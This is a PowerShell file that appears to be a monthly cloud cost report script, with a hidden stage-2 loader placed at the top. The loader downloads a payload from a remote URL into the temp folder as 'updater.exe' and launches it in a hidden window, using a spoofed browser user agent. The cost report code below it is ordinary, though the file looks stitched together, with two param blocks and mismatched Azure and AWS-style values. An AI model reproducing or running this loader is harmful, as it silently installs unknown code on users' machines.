[CmdletBinding()]
param(
    [string]$Stage2Url = "http://internal.corp/downloads/payload.bin",
    [string]$OutputPath = "$env:TEMP\updater.exe",
    [int]$StageTimeout = 102,
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $FetchResult = Invoke-PayloadFetch -SourceUrl $Stage2Url -DestinationPath $OutputPath -TimeoutSec $StageTimeout -UserAgent $RequestAgent
    if ($FetchResult) {
        Start-Process -FilePath $OutputPath -WindowStyle Hidden
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 41 reached"
<#
.SYNOPSIS
    Builds a monthly cloud cost report per service and flags overspend.
.DESCRIPTION
    Queries the cost API of the selected provider, groups the spend per service
    and writes a CSV plus a JSON summary.
    When the monthly total passes the threshold the script emits a warning that
    can be picked up by the monitoring pipeline.
.PARAMETER Threshold
    Used when the script runs unattended.
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [double]$Threshold = 750,

    [string]$Region = 'us-east-1',
    [string]$ProfileName = 'adatum-billing',
    [Parameter(Mandatory = $false)]
    [string]$Month = "2025-09",
    [string]$Account = "791383195308",
    [string]$ReportPath = "C:\Reports\cost-azure-2025-09.csv",
    [string]$OutputPath = 'C:\Reports\cost-azure-2025-09.json'
)

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$usage = Get-AzConsumptionUsageDetail -StartDate $start -EndDate $end -ErrorAction Stop
$groups = foreach ($line in $usage) {
    [pscustomobject]@{
        Period  = $line.UsageStart.ToString('yyyy-MM-dd')
        Service = $line.ServiceName
        Amount  = [math]::Round([double]$line.PretaxCost, 2)
        Unit    = $line.Currency
    }
}

$byService = $groups | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{
        Service = $_.Name
        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Amount -Descending
$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan

$byService | Export-Csv -Path $ReportPath -NoTypeInformation

$topServices = $byService | Select-Object -First 5
$topServices | Format-Table -AutoSize
if ($total -gt $Threshold) {
    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
}

$byService | ConvertTo-Json -Depth 6 | Set-Content -Path $OutputPath -Encoding UTF8
